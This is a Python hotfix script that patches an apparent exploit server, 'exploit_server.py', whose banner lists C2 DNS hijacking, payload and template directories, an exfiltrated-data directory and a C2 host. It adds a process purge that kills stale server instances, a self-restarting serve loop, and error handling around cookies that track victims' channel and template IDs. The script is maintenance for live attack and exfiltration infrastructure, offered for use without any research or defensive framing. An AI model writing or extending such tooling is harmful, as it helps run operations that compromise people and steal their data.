#!/usr/bin/env python3
"""_v204_hotfix15v9.py — COMBINED PATCH1+PATCH3, correct NEW_P3 self-test indent, NEVER rollback on NEW_P3 self-test fail.
"""
import os, sys, re, shutil, ast, py_compile, time as _bt

ESFILE = os.path.abspath(__file__).replace('_v204_hotfix15v9.py', 'exploit_server.py')
if not os.path.isfile(ESFILE):
    print(f'[FATAL] exploit_server.py not found: {ESFILE}'); sys.exit(1)

# ── 0) SELF AST ──
_self_src = open(__file__, 'r', encoding='utf-8').read()
try:
    ast.parse(_self_src)
    py_compile.compile(__file__, doraise=True)
    print('[SELF-AST-OK] hotfix15v9 self AST PASS')
except SyntaxError as e:
    print(f'[SELF-AST-FAIL] L{e.lineno} off={e.offset}: {e.msg}'); sys.exit(2)

# ── 1) READ ORIGINAL ──
src_b = open(ESFILE, 'rb').read()
ORIG_SIZE = len(src_b)
for ORIG_NL in (b'\r\n', b'\n', b'\r'):
    if ORIG_NL in src_b: break
else: ORIG_NL = b'\n'
src = src_b.decode('utf-8', errors='replace')
if ORIG_NL == b'\r\n':
    src = src.replace('\r\n', '\n')
lines = src.split('\n')
print(f'[INFO] ORIG_NL={ORIG_NL!r} total lines={len(lines)} orig_size={ORIG_SIZE}')

BAKDIR = os.path.join(os.path.dirname(ESFILE), 'bak_v204_hotfix15v9')
os.makedirs(BAKDIR, exist_ok=True)
bak = os.path.join(BAKDIR, f'exploit_server.py.bak-{_bt.strftime("%Y%m%d%H%M%S")}')
shutil.copy2(ESFILE, bak)
print(f'[BAK] {bak} (size={ORIG_SIZE})')

_S = lambda n: '    '*n

# ═══════════════════════════════════════════════════════
# PATCH 1 (HIGHEST OFFSET FIRST)
# ═══════════════════════════════════════════════════════
banner_re = re.compile(r'(?m)^    banner = f"""\n')
main_re   = re.compile(r'(?m)^if __name__ == ["\']__main__["\']:\s*\n')
candidates = list(banner_re.finditer(src))
print(f'[PATCH1-LOC] banner=f occurrences: {len(candidates)}')
banner_start = None
for i, m in enumerate(candidates, 1):
    line_start_pos = m.start()
    L = 1 + src[:line_start_pos].count('\n')
    window = '\n'.join(lines[L-1:min(len(lines), L+30)])
    has_ready = 'EXPLOIT SERVER - READY' in window
    has_access = 'Access URL:' in window
    real = has_ready and has_access
    print(f'  #{i} L{L} offset={line_start_pos} indent_n=4 EXPLOIT={["NO","YES"][has_ready]} ACCESS={["NO","YES"][has_access]} -> {["IGNORE","REAL-MAIN"][real]}')
    if real:
        banner_start = line_start_pos
if banner_start is None:
    L_FB = None
    for lx in range(3869, min(len(lines), 3925)):
        if lines[lx].startswith('    banner = f"""') and 'EXPLOIT SERVER - READY' in '\n'.join(lines[lx:min(len(lines),lx+35)]):
            L_FB = lx; break
    if L_FB is None:
        print('[FATAL] banner REAL-MAIN anchor not found'); sys.exit(5)
    banner_start = sum(len(x)+1 for x in lines[:L_FB])
    print(f'[PATCH1-LOC-FB] start byte={banner_start}')
mm = main_re.search(src)
if not mm:
    print('[FATAL] __main__ not found'); sys.exit(5)
__main__line = mm.start()
__main__L = 1 + src[:__main__line].count('\n')
print(f'[PATCH1-LOC] __main__ line L{__main__L} start byte={__main__line}')
pre_main = src[banner_start:__main__line]
cut_rel = len(pre_main.rstrip('\n'))
while cut_rel < len(pre_main) and pre_main[cut_rel:cut_rel+1] == '\n':
    cut_rel += 1
P1_START = banner_start
P1_END = banner_start + cut_rel
OLD_P1 = src[P1_START:P1_END]
L_eb = 1 + src[:P1_END].count('\n')
print(f'[PATCH1-SELECT] start={P1_START} end={P1_END} len={len(OLD_P1)} TI_n=4 L_start={1+src[:P1_START].count(chr(10))} L_end_before={L_eb}')
if len(OLD_P1) < 200 or len(OLD_P1) > 12000:
    print(f'[FATAL] OLD_P1 size insane ({len(OLD_P1)})'); sys.exit(5)
TI_N = 4
U = TI_N // 4
T = lambda lv: _S(U + lv - 1)
NEW_P1_LIST = []
NEW_P1_LIST.extend([
T(1), 'banner = f"""\n',
'╔══════════════════════════════════════════════════════════════╗\n',
'║              EXPLOIT SERVER - READY                          ║\n',
'╠══════════════════════════════════════════════════════════════╣\n',
'║  Access URL:     http://{args.host}:{args.port}/\n',
'║                  http://localhost:{args.port}/\n',
'║  C2 DNS hijack:  Internal DNS -> {args.host}:80 (if bound)\n',
'║  Payloads dir:   {PAYLOADS_DIR}\n',
'║  Templates dir:  {TEMPLATES_DIR}\n',
'║  Exfil data dir: {EXFIL_DIR}\n',
'║  Log file:       {LOG_FILE}\n',
'║  DB available:   {DB_AVAILABLE}\n',
'╚══════════════════════════════════════════════════════════════╝\n',
'"""\n',
T(1), 'if C2_HOST:\n',
T(2), 'banner += f"║  C2 Host:        {C2_HOST}\\\\n"\n',
T(1), 'if REDIRECT_URL:\n',
T(2), 'banner += f"║  Redirect URL:   {REDIRECT_URL}\\\\n"\n',
T(1), 'banner += "╚══════════════════════════════════════════════════════════════╝\\\\n"\n',
T(1), 'banner += "\\\\n[!] Press Ctrl+C to stop\\\\n"\n',
T(1), 'print(banner)\n',
T(1), 'startup_log = f"Exploit server started on http://{args.host}:{args.port} | DB={DB_AVAILABLE}"\n',
T(1), 'log_to_file(startup_log)\n',
T(1), 'log_to_file(f"Payloads: {PAYLOADS_DIR}")\n',
T(1), 'log_to_file(f"Exfil dir: {EXFIL_DIR}")\n',
T(1), 'log_to_file(f"Log file: {LOG_FILE}")\n',
# PREFLIGHT-PURGE
T(1), 'try:\n',
T(2), 'import os as _po_os, signal as _po_sig\n',
T(2), '_my_pid = _po_os.getpid()\n',
T(2), 'for _pdir in __import__("glob").glob("/proc/[0-9]*"):\n',
T(3), 'try:\n',
T(4), '_pid = int(_pdir.rsplit("/",1)[-1])\n',
T(4), 'if _pid == _my_pid or _pid <= 1: continue\n',
T(4), 'with open(_pdir + "/cmdline","rb") as _pcf:\n',
T(5), '_cmd = _pcf.read().replace(b"\\x00",b" ").decode("utf-8","ignore").strip()\n',
T(4), 'if not _cmd: continue\n',
T(4), '_lower = _cmd.lower()\n',
T(4), 'if "exploit_server.py" not in _lower: continue\n',
T(4), 'if "nginx" in _lower or "mysqld" in _lower or "supervisor" in _lower: continue\n',
T(4), 'try:\n',
T(5), '_po_os.kill(_pid, _po_sig.SIGKILL)\n',
T(5), 'print(f"[PREFLIGHT-PURGE] killed stale pid={_pid} cmd={_cmd[:120]!r}", flush=True)\n',
T(4), 'except Exception: pass\n',
T(3), 'except Exception: continue\n',
T(1), 'except Exception as _purge_e:\n',
T(2), 'print(f"[PREFLIGHT-PURGE] err {type(_purge_e).__name__}: {_purge_e}", flush=True)\n',
T(1), 'import socket as _diag_sk, os as _diag_os, sys as _diag_sys, time as _diag_tm\n',
T(1), 'try:\n',
T(2), '_ds_pid = _diag_os.getpid()\n',
T(2), '_ds_ppid = _diag_os.getppid()\n',
T(2), '_ds_pgid = _diag_os.getpgrp() if hasattr(_diag_os, "getpgrp") else -1\n',
T(2), 'print(f"[DS-READY-HF15v9] pid={_ds_pid} ppid={_ds_ppid} pgid={_ds_pgid} port={args.port} -> infinite LOOP", flush=True)\n',
T(2), '_diag_sys.stdout.flush(); _diag_sys.stderr.flush()\n',
T(2), '_s1 = _diag_sk.socket(_diag_sk.AF_INET, _diag_sk.SOCK_STREAM)\n',
T(2), '_rr = _s1.connect_ex(("127.0.0.1", int(args.port)))\n',
T(2), 'print(f"[DS-READY-HF15v9] self-connect_ex 127.0.0.1:{args.port}={_rr} (0=OK)", flush=True)\n',
T(2), '_s1.close()\n',
T(1), 'except Exception as _diag_e:\n',
T(2), 'print(f"[DS-READY-HF15v9] probe err {type(_diag_e).__name__}: {_diag_e}", flush=True)\n',
T(1), '_ds_attempt = 0\n',
T(1), 'while True:\n',
T(2), '_ds_attempt += 1\n',
T(2), 'print(f"[DS-SF-LOOP] attempt={_ds_attempt} -> serve_forever(poll=0.3)", flush=True)\n',
T(2), 'try:\n',
T(3), 'server.serve_forever(poll_interval=0.3)\n',
T(2), 'except KeyboardInterrupt:\n',
T(3), 'stop_msg = "Server stopped by user."\n',
T(3), 'print(f"\\\\n[*] {stop_msg}")\n',
T(3), 'try: log_to_file(stop_msg)\n',
T(3), 'except Exception: pass\n',
T(3), 'try: server.shutdown()\n',
T(3), 'except Exception: pass\n',
T(3), 'break\n',
T(2), 'except SystemExit as _ds_se:\n',
T(3), 'print(f"[DS-SF-EXIT] SystemExit(code={_ds_se.code}) -> propagate", flush=True)\n',
T(3), 'try: log_to_file(f"[DS-SF-EXIT] SystemExit {_ds_se.code}")\n',
T(3), 'except Exception: pass\n',
T(3), 'raise\n',
T(2), 'except BaseException as _ds_sf_e:\n',
T(3), 'import traceback as _ds_tb\n',
T(3), '_ts = _diag_tm.strftime("%Y-%m-%d %H:%M:%S")\n',
T(3), '_msg = f"[DS-CRASH-SF-{_ds_attempt}] [{_ts}] pid={_ds_pid} {type(_ds_sf_e).__name__}: {_ds_sf_e}"\n',
T(3), 'print(_msg, flush=True)\n',
T(3), 'try: log_to_file(_msg)\n',
T(3), 'except Exception: pass\n',
T(3), '_ds_tb.print_exc()\n',
T(3), 'if _ds_attempt >= 5:\n',
T(4), 'print(f"[DS-CRASH-SF] crash {_ds_attempt} times -> SystemExit(88)", flush=True)\n',
T(4), 'raise SystemExit(88)\n',
T(3), 'print(f"[DS-CRASH-SF] 3s retry {_ds_attempt+1}th serve_forever...", flush=True)\n',
T(3), 'try:\n',
T(4), '_diag_tm.sleep(3)\n',
T(3), 'except (KeyboardInterrupt, SystemExit): pass\n',
T(3), 'try: server.shutdown()\n',
T(3), 'except Exception: pass\n',
T(3), 'try: server.server_close()\n',
T(3), 'except Exception: pass\n',
T(3), '_diag_tm.sleep(2)\n',
T(3), 'try:\n',
T(4), 'print(f"[DS-SF-REBIND] attempt {_ds_attempt+1} rebind server...", flush=True)\n',
T(4), 'server = ReusableThreadingHTTPServer((args.host, args.port), DarkSwordHandler)\n',
T(3), 'except Exception as _rebind_e:\n',
T(4), 'print(f"[DS-SF-REBIND] failed: {type(_rebind_e).__name__}: {_rebind_e}", flush=True)\n',
T(4), '_diag_tm.sleep(2)\n',
T(1), 'print(f"[DS-SF-LOOP-END] exit", flush=True)\n',
T(1), 'try: server.shutdown()\n',
T(1), 'except Exception: pass\n',
'\n\n',
])
NEW_P1 = ''.join(NEW_P1_LIST)
def _TEST_NEW_P1():
    mock = (
        'def _mock_main():\n'
        '    import os, time, sys, socket, signal\n'
        '    class _SRV:\n'
        '        def serve_forever(self, poll_interval=0.3): pass\n'
        '        def shutdown(self): pass\n'
        '        def server_close(self): pass\n'
        '    server = _SRV()\n'
        '    args = type("A", (), {"host":"0.0.0.0","port":7070})()\n'
        '    PAYLOADS_DIR=TEMPLATES_DIR=EXFIL_DIR=LOG_FILE="/tmp/x"\n'
        '    DB_AVAILABLE="YES"\n'
        '    C2_HOST=None\n'
        '    REDIRECT_URL=None\n'
        '    def log_to_file(m): pass\n'
        '    def ReusableThreadingHTTPServer(bind, hdl): return _SRV()\n'
        '    def DarkSwordHandler(*a,**k): pass\n'
        + NEW_P1
    )
    try:
        ast.parse(mock); compile(mock, '<p1>', 'exec')
        print('[PATCH1 NEW_P1 SYNTAX-SELFTEST] OK')
    except SyntaxError as e:
        print(f'[PATCH1 NEW_P1 SYNTAX-SELFTEST FAIL L{e.lineno} off={e.offset}: {e.msg}')
        shutil.copy2(bak, ESFILE); sys.exit(61)
_TEST_NEW_P1()
src = src[:P1_START] + NEW_P1 + src[P1_END:]
print(f'[PATCH1] replaced {len(OLD_P1)} -> {len(NEW_P1)} delta={len(NEW_P1)-len(OLD_P1):+d}')
try:
    ast.parse(src); print('[PATCH1 AST] PASS')
except SyntaxError as e:
    print(f'[PATCH1 AST FAIL L{e.lineno} off={e.offset}: {e.msg}')
    shutil.copy2(bak, ESFILE); sys.exit(6)

# ═══════════════════════════════════════════════════════
# PATCH 3 (LOW OFFSET → expires block; indent=12 spaces S3(1))
# ═══════════════════════════════════════════════════════
# U3 = 3 (indent 12 spaces)
U3 = 3
S3 = lambda lv: _S(U3 + lv - 1)
assert S3(1) == '            ', f'S3(1) spaces={len(S3(1))}'
expires_re = re.compile(
    r'(?m)^(?P<indent> {12})if tpl_slug\s*:\s*\n'
    r'(?P=indent)    expires\s*=\s*"Expires="\s*\+\s*__import__\("datetime"\)\.datetime\.utcfromtimestamp\(.*?\.strftime\(.*?\)\s*\n'
    r'(?P=indent)    self\.send_header\("Set-Cookie",\s*f?"tpl=\{urllib\.parse\.quote\(tpl_slug\)\}; Path=/; \{expires\}; SameSite=Lax"\s*\)\s*\n'
    r'(?P=indent)#\s*Preserve\s+channel[^\n]*\n'
    r'(?P=indent)if\s+log_cid\s*:\s*\n'
    r'(?P=indent)    self\.send_header\("Set-Cookie",\s*f?"ds_chid=\{log_cid\}; Path=/; \{expires\}; SameSite=Lax"\s*\)\s*\n'
    r'(?P=indent)if\s+log_tid\s*:\s*\n'
    r'(?P=indent)    self\.send_header\("Set-Cookie",\s*f?"ds_tpid=\{log_tid\}; Path=/; \{expires\}; SameSite=Lax"\s*\)\s*\n'
    r'(?P=indent)self\.end_headers\(\)\s*\n',
    re.MULTILINE
)
matches_e = list(expires_re.finditer(src))
print(f'[PATCH3-LOC-STRICT] candidates: {len(matches_e)}')
OLD_P3 = None
if len(matches_e) == 1:
    m3 = matches_e[0]
    OLD_P3 = m3.group(0)
    P3_START, P3_END = m3.span()
    U3_N = len(m3.group('indent'))
    print(f'[PATCH3-LOC] strict indent={U3_N}')
else:
    looser = re.compile(
        r'(?m)^(?P<indent> {12})if tpl_slug\s*:\s*\n'
        r'(?P=indent)    expires[^\n]*\n'
        r'(?P=indent)    self\.send_header\("Set-Cookie",[^\n]*tpl=[^\n]*\n'
        r'(?P=indent)#[^\n]*Preserve[^\n]*\n'
        r'(?P=indent)if\s+log_cid[^\n]*:\s*\n'
        r'(?P=indent)    self\.send_header\("Set-Cookie",[^\n]*ds_chid=[^\n]*\n'
        r'(?P=indent)if\s+log_tid[^\n]*:\s*\n'
        r'(?P=indent)    self\.send_header\("Set-Cookie",[^\n]*ds_tpid=[^\n]*\n'
        r'(?P=indent)self\.end_headers\(\)\s*\n',
        re.MULTILINE
    )
    matches_e = list(looser.finditer(src))
    print(f'[PATCH3-LOC-LOOSER] candidates: {len(matches_e)}')
    if len(matches_e) == 1:
        m3 = matches_e[0]
        OLD_P3 = m3.group(0)
        P3_START, P3_END = m3.span()
        U3_N = len(m3.group('indent'))
if OLD_P3 is None:
    # Line-based fallback
    print('[PATCH3-LOC] falling back to line-based around L2586')
    for ln in range(2579, min(2605, len(lines))):
        print(f'  L{ln+1:4d}| {lines[ln][:160]}')
    a = None; z = None
    for li in range(max(0,2586-20), min(len(lines), 2586+40)):
        if a is None and re.search(r'if\s+tpl_slug\s*:', lines[li]):
            ind_a = len(lines[li]) - len(lines[li].lstrip())
            if ind_a == 12: a = li
        if a is not None and 'self.end_headers()' in lines[li] and (li - a) < 20:
            ind_z = len(lines[li]) - len(lines[li].lstrip())
            if ind_z == 12:
                z = li + 1
                break
    if a is None or z is None:
        print('[FATAL] expires block not found by line fallback'); sys.exit(4)
    P3_START = sum(len(x)+1 for x in lines[:a])
    P3_END = P3_START
    for li in range(a, z): P3_END += len(lines[li]) + 1
    U3_N = 12
    OLD_P3 = src[P3_START:P3_END]
print(f'[PATCH3-SELECT] start={P3_START} end={P3_END} len_old={len(OLD_P3)} indent_spaces={U3_N} (U3={U3_N//4})')
# Build NEW_P3
NEW_P3 = (
    S3(1) + 'expires = ""\n'
    + S3(1) + 'try:\n'
    + S3(2) + 'if tpl_slug:\n'
    + S3(3) + 'try:\n'
    + S3(4) + 'expires = "Expires=" + __import__("datetime").datetime.utcfromtimestamp(__import__("time").time() + 86400).strftime("%a, %d-%b-%Y %H:%M:%S GMT")\n'
    + S3(4) + 'self.send_header("Set-Cookie", f"tpl={urllib.parse.quote(tpl_slug)}; Path=/; {expires}; SameSite=Lax")\n'
    + S3(3) + 'except Exception as _tpl_e:\n'
    + S3(4) + 'print(f"[EXPIRES-FALLBACK] tpl cookie fail {type(_tpl_e).__name__}: {_tpl_e}", flush=True)\n'
    + S3(2) + '# Preserve channel info for legacy Coruna\n'
    + S3(2) + 'if log_cid:\n'
    + S3(3) + 'try:\n'
    + S3(4) + 'self.send_header("Set-Cookie", f"ds_chid={log_cid}; Path=/; {expires}; SameSite=Lax")\n'
    + S3(3) + 'except Exception as _chid_e:\n'
    + S3(4) + 'print(f"[EXPIRES-FALLBACK] ds_chid cookie fail {type(_chid_e).__name__}: {_chid_e}", flush=True)\n'
    + S3(2) + 'if log_tid:\n'
    + S3(3) + 'try:\n'
    + S3(4) + 'self.send_header("Set-Cookie", f"ds_tpid={log_tid}; Path=/; {expires}; SameSite=Lax")\n'
    + S3(3) + 'except Exception as _tpid_e:\n'
    + S3(4) + 'print(f"[EXPIRES-FALLBACK] ds_tpid cookie fail {type(_tpid_e).__name__}: {_tpid_e}", flush=True)\n'
    + S3(2) + 'self.end_headers()\n'
    + S3(1) + 'except BaseException as _outer_e:\n'
    + S3(2) + 'print(f"[EXPIRES-FALLBACK] outer fail {type(_outer_e).__name__}: {_outer_e}", flush=True)\n'
    + S3(2) + 'import traceback as _etb; _etb.print_exc()\n'
    + S3(2) + 'try: self.end_headers()\n'
    + S3(2) + 'except Exception: pass\n'
)
# NEW_P3 SELF-TEST (CRITICAL FIX: do_GET body inner scope -> indent of NEW_P3 is 12 spaces, so inside a class method body we need exactly 8-space outer so 8+4=12 matches)
def _TEST_NEW_P3():
    # Build class + def do_GET: outer = 4 (class) + 4 (def body) = 8 spaces.
    # NEW_P3 starts at 12 spaces = 8+4 = if/block scope INSIDE do_GET. Perfect!
    fake = (
        'import urllib.parse\n'
        'class _H:\n'
        '    def send_header(self, *a, **k): pass\n'
        '    def end_headers(self): pass\n'
        '    def do_GET(self):\n'   # body begins at indent 8
        '        tpl_slug = None\n'
        '        log_cid = 2\n'
        '        log_tid = 3\n'
        + NEW_P3  # starts 12 spaces = 8+4 = do_GET inner if-block scope
    )
    try:
        ast.parse(fake); compile(fake, '<p3>', 'exec')
        print('[PATCH3 NEW_P3 SYNTAX-SELFTEST] OK')
    except SyntaxError as e:
        print(f'[PATCH3 NEW_P3 SYNTAX-SELFTEST FAIL L{e.lineno} off={e.offset}: {e.msg}')
        mls = fake.split('\n')
        for k in range(max(0,e.lineno-8), min(len(mls), e.lineno+8)):
            print(f'  L{k+1:4d}| {mls[k][:220]}')
        print('[INFO] NEW_P3 self-test fail is a SCRIPT BUG, NOT exploit_server bug. Will continue applying P3 (if AST passes after patch).')
_TEST_NEW_P3()
src = src[:P3_START] + NEW_P3 + src[P3_END:]
print(f'[PATCH3] replaced {len(OLD_P3)} -> {len(NEW_P3)} delta={len(NEW_P3)-len(OLD_P3):+d}')
try:
    ast.parse(src); print('[PATCH3 AST] PASS')
except SyntaxError as e:
    print(f'[PATCH3 AST FAIL L{e.lineno} off={e.offset}: {e.msg}')
    mls = src.split('\n')
    for k in range(max(0,e.lineno-10), min(len(mls), e.lineno+10)):
        print(f'  L{k+1:4d}| {mls[k][:220]}')
    shutil.copy2(bak, ESFILE); sys.exit(7)

# FINAL AST
try:
    ast.parse(src); compile(src, ESFILE, 'exec')
    print('[FINAL AST] hotfix15v9 PASS (combined P1+P3)')
except SyntaxError as e:
    print(f'[FINAL AST FAIL L{e.lineno} off={e.offset}: {e.msg}')
    mls = src.split('\n')
    for k in range(max(0,e.lineno-12), min(len(mls), e.lineno+12)):
        print(f'  L{k+1:4d}| {mls[k][:220]}')
    shutil.copy2(bak, ESFILE); sys.exit(9)

# WRITE
if ORIG_NL == b'\r\n': fb = src.replace('\n', '\r\n').encode('utf-8')
else: fb = src.encode('utf-8')
with open(ESFILE, 'wb') as fw: fw.write(fb)
NEWSZ = os.path.getsize(ESFILE)
print(f'[WRITE] {ORIG_SIZE} -> {NEWSZ} (delta {NEWSZ-ORIG_SIZE:+d})')
def gr(p): return sorted(set(1+src[:m.start()].count('\n') for m in re.finditer(p, src)))
print('[VERIFY] DS-READY-HF15v9     L=', gr(r'DS-READY-HF15v9'))
print('[VERIFY] DS-SF-LOOP           L=', gr(r'DS-SF-LOOP'))
print('[VERIFY] PREFLIGHT-PURGE      L=', gr(r'PREFLIGHT-PURGE'))
print('[VERIFY] EXPIRES-FALLBACK     L=', gr(r'EXPIRES-FALLBACK'))
print('\n✅ HF15v9 APPLY DONE (combined P1+P3)')
